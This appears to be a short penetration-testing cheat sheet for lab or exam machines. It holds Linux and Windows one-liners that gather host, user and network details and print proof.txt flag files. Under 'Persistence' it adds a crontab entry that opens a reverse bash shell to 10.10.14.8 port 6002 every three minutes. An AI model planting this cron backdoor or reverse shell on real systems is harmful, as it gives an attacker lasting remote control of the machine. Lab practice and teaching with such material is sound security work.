# Proof

_Linux_

```bash
 echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
```

_Windows_

```powershell
 echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
```

# Persistence

_Crontab_

```bash
(crontab -l ; echo "*/3 * * * *   	/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.8/6002 0>&1'")|crontab 2> /dev/null
```
